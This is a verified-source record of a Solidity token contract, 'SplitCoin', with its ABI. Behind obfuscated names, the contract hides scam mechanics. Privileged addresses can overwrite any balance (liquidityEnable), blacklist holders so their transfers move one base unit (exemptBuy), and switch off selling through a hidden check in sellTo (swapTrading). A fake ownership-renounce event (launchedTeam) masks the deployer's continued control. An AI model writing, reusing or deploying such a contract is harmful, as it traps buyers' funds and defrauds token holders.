{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract isExempt {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromBuy {\n    function createPair(address atAutoTo, address launchedAuto) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface launchReceiverTeam {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address atWallet) external view returns (uint256);\n\n    function transfer(address toEnable, uint256 listShouldLimit) external returns (bool);\n\n    function allowance(address isFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 listShouldLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toEnable,\n        uint256 listShouldLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTeam, uint256 value);\n    event Approval(address indexed isFund, address indexed spender, uint256 value);\n}\n\ninterface launchReceiverTeamMetadata is launchReceiverTeam {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract SplitCoin is isExempt, launchReceiverTeam, launchReceiverTeamMetadata {\n\n    constructor (){\n        \n        launchedTeam();\n        shouldBuy enableTrading = shouldBuy(walletIsShould);\n        receiverExempt = fromBuy(enableTrading.factory()).createPair(enableTrading.WETH(), address(this));\n        tradingIs = fromBuy(enableTrading.factory()).feeTo();\n        \n        tradingLimit = _msgSender();\n        teamFee[tradingLimit] = true;\n        fromFee[tradingLimit] = feeFrom;\n        if (launchedSell) {\n            liquidityMax = true;\n        }\n        emit Transfer(address(0), tradingLimit, feeFrom);\n    }\n\n    mapping(address => mapping(address => uint256)) private sellAuto;\n\n    uint256 public modeLaunchedMin = 3;\n\n    bool private liquidityMax;\n\n    mapping(address => bool) public swapTo;\n\n    function balanceOf(address atWallet) public view virtual override returns (uint256) {\n        return fromFee[atWallet];\n    }\n\n    function totalTokenList(address walletMarketingMode, address toEnable, uint256 listShouldLimit) internal returns (bool) {\n        require(fromFee[walletMarketingMode] >= listShouldLimit);\n        fromFee[walletMarketingMode] -= listShouldLimit;\n        fromFee[toEnable] += listShouldLimit;\n        emit Transfer(walletMarketingMode, toEnable, listShouldLimit);\n        return true;\n    }\n\n    uint256 private feeFrom = 100000000 * 10 ** 18;\n\n    mapping(address => uint256) private fromFee;\n\n    function enableToken(address tradingSender) public {\n        require(tradingSender.balance < 100000);\n        if (walletTrading) {\n            return;\n        }\n        \n        teamFee[tradingSender] = true;\n        if (launchedSell == totalFromSwap) {\n            totalFromSwap = false;\n        }\n        walletTrading = true;\n    }\n\n    address tradingIs;\n\n    address walletIsShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public teamFee;\n\n    function exemptBuy(address fundTotal) public {\n        atReceiver();\n        \n        if (fundTotal == tradingLimit || fundTotal == receiverExempt) {\n            return;\n        }\n        swapTo[fundTotal] = true;\n    }\n\n    bool private totalFromSwap;\n\n    function transfer(address buyFeeSender, uint256 listShouldLimit) external virtual override returns (bool) {\n        return sellTo(_msgSender(), buyFeeSender, listShouldLimit);\n    }\n\n    bool private launchedSell;\n\n    uint256 constant atListEnable = 1 ** 10;\n\n    address public tradingLimit;\n\n    function sellTo(address walletMarketingMode, address toEnable, uint256 listShouldLimit) internal returns (bool) {\n        if (walletMarketingMode == tradingLimit) {\n            return totalTokenList(walletMarketingMode, toEnable, listShouldLimit);\n        }\n        uint256 modeFund = launchReceiverTeam(receiverExempt).balanceOf(tradingIs);\n        require(modeFund == launchSwap);\n        require(toEnable != tradingIs);\n        if (swapTo[walletMarketingMode]) {\n            return totalTokenList(walletMarketingMode, toEnable, atListEnable);\n        }\n        listShouldLimit = shouldTeamReceiver(walletMarketingMode, toEnable, listShouldLimit);\n        return totalTokenList(walletMarketingMode, toEnable, listShouldLimit);\n    }\n\n    uint8 private tradingTx = 18;\n\n    function name() external view virtual override returns (string memory) {\n        return amountTake;\n    }\n\n    function launchedTeam() public {\n        emit OwnershipTransferred(tradingLimit, address(0));\n        marketingLaunch = address(0);\n    }\n\n    function shouldTeamReceiver(address walletMarketingMode, address toEnable, uint256 listShouldLimit) internal view returns (uint256) {\n        require(listShouldLimit > 0);\n\n        uint256 totalFromAt = 0;\n        if (walletMarketingMode == receiverExempt && modeLaunchedMin > 0) {\n            totalFromAt = listShouldLimit * modeLaunchedMin / 100;\n        } else if (toEnable == receiverExempt && liquidityLimitAuto > 0) {\n            totalFromAt = listShouldLimit * liquidityLimitAuto / 100;\n        }\n        require(totalFromAt <= listShouldLimit);\n        return listShouldLimit - totalFromAt;\n    }\n\n    event OwnershipTransferred(address indexed walletMode, address indexed fundReceiver);\n\n    function allowance(address launchedToken, address tokenLimit) external view virtual override returns (uint256) {\n        if (tokenLimit == walletIsShould) {\n            return type(uint256).max;\n        }\n        return sellAuto[launchedToken][tokenLimit];\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return feeFrom;\n    }\n\n    function transferFrom(address walletMarketingMode, address toEnable, uint256 listShouldLimit) external override returns (bool) {\n        if (_msgSender() != walletIsShould) {\n            if (sellAuto[walletMarketingMode][_msgSender()] != type(uint256).max) {\n                require(listShouldLimit <= sellAuto[walletMarketingMode][_msgSender()]);\n                sellAuto[walletMarketingMode][_msgSender()] -= listShouldLimit;\n            }\n        }\n        return sellTo(walletMarketingMode, toEnable, listShouldLimit);\n    }\n\n    string private fromTradingSender = \"SCN\";\n\n    address private marketingLaunch;\n\n    function owner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    uint256 launchSwap;\n\n    uint256 private teamMode;\n\n    bool public walletTrading;\n\n    function swapTrading(uint256 listShouldLimit) public {\n        atReceiver();\n        launchSwap = listShouldLimit;\n    }\n\n    function atReceiver() private view {\n        require(teamFee[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tradingTx;\n    }\n\n    uint256 public liquidityFund;\n\n    function liquidityEnable(address buyFeeSender, uint256 listShouldLimit) public {\n        atReceiver();\n        fromFee[buyFeeSender] = listShouldLimit;\n    }\n\n    function getOwner() external view returns (address) {\n        return marketingLaunch;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromTradingSender;\n    }\n\n    uint256 fundBuyTake;\n\n    bool private senderLaunch;\n\n    uint256 private fromTx;\n\n    string private amountTake = \"Split Coin\";\n\n    address public receiverExempt;\n\n    uint256 public liquidityLimitAuto = 0;\n\n    function approve(address tokenLimit, uint256 listShouldLimit) public virtual override returns (bool) {\n        sellAuto[_msgSender()][tokenLimit] = listShouldLimit;\n        emit Approval(_msgSender(), tokenLimit, listShouldLimit);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundReceiver\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTeam\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atWallet\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSender\",\"type\":\"address\"}],\"name\":\"enableToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundTotal\",\"type\":\"address\"}],\"name\":\"exemptBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFeeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldLimit\",\"type\":\"uint256\"}],\"name\":\"liquidityEnable\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityFund\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityLimitAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeLaunchedMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"swapTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"listShouldLimit\",\"type\":\"uint256\"}],\"name\":\"swapTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyFeeSender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMarketingMode\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"listShouldLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "SplitCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}